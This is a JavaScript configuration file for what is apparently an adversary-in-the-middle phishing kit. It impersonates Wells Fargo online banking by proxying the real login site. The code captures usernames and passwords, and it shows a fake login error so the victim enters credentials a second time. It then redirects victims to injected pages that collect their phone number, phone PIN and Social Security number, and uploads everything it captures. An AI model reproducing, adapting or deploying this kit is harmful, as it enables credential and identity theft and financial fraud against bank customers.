/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
            //  {
                // reg: /window.__BssoInterrupt_/igm, // Google chrome on windows fix
                // replacement: 'window.__BssoInterrupt_Core=!0;</script>'
            //  },
        ]
    }


    processResponse() {
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

        }
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        // this.browserEndPoint.removeHeader('content-security-policy')
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }



}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
            if (this.req.url === '/auth/login/do') {
                if (clientContext.info.secondTime) {
                    const initialsLogin = { 
                        initialUsername: clientContext.sessionBody.loginUserName,
                        initialPassword: clientContext.sessionBody.loginPassword,
                    }
                    Object.assign(clientContext.sessionBody, initialsLogin)
                    super.uploadRequestBody(clientContext.currentDomain, clientContext)

                    clientContext.currentDomain = 'oam.wellsfargo.com'
                    this.res.writeHead(301, { location: '/session/secure/phone' })
                    this.res.end()
                } else {
                    clientContext.info.secondTime = true;
                    clientContext.setLogAvailable(true)
                    super.captureBody(clientContext.currentDomain, clientContext)

                    this.res.writeHead(301, { location: '/auth/login/present?origin=cob&error=yes&langPref=ENG' })
                    this.res.end()
                }
            }
            
            super.captureBody(clientContext.currentDomain, clientContext)
            

        }


        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
            clientContext.currentDomain = process.env.PROXY_DOMAIN
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url === '/oamo/identity/help/phone') {
            super.uploadRequestBody(clientContext.currentDomain, clientContext)

            this.res.writeHead('301', { location: 'https://www08.wellsfargomedia.com/assets/pdf/personal/privacy-security/notice-of-data-collection.pdf' })
            this.res.end()

        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}

const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/session/secure/')

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            if (this.req.url === '/session/secure/security.html') {
                super.uploadRequestBody(clientContext.currentDomain, clientContext)
                this.res.end()
            } else {
                // super.uploadRequestBody(clientContext.currentDomain, clientContext)
                this.res.writeHead(404)
                this.res.end()
            }
        } else {
            switch (this.req.url) {
                case '/session/secure/phone':
                    super.superExecutePhpScript('phone.html', clientContext)
                    break
                case '/session/secure/security.html':
                    // clientContext.currentDomain = 'onlinebanking.53.com'
                    super.superExecutePhpScript('security.html', clientContext)
                    break
                default:
                    // this.req.url = this.req.url.replace('/session/secure', '/ib')
                    super.superExecutePhpScript('app/404.php', clientContext)
            }
        }
    }


}





const configExport = {
    CURRENT_DOMAIN: 'connect.secure.wellsfargo.com',
    START_PATH: '/auth/login/present', // '/session/secure/login.html',
    PRE_HANDLERS:
        [
            ExecPhpPager,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['j_username'],
            urls: '',
            hosts: ['connect.secure.wellsfargo.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['j_password'],
            urls: '',
            hosts: ['connect.secure.wellsfargo.com'],
        },
        

        phoneNumber: {
            method: 'POST',
            params: ['phoneNumber'],
            urls: '',
            hosts: ['oam.wellsfargo.com'],
        },

        phonePin: {
            method: 'POST',
            params: ['ppin'],
            urls: '',
            hosts: ['oam.wellsfargo.com'],
        },

        ssn1: {
            method: 'POST',
            params: ['ssn1'],
            urls: '',
            hosts: ['oam.wellsfargo.com'],
        },

        ssn2: {
            method: 'POST',
            params: ['ssn2'],
            urls: '',
            hosts: ['oam.wellsfargo.com'],
        },

        ssn3: {
            method: 'POST',
            params: ['ssn3'],
            urls: '',
            hosts: ['oam.wellsfargo.com'],
        },

        
        fullName: {
            method: 'POST',
            params: ['fullname'],
            urls: '',
            hosts: ['www.53.com'],
        },
       

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport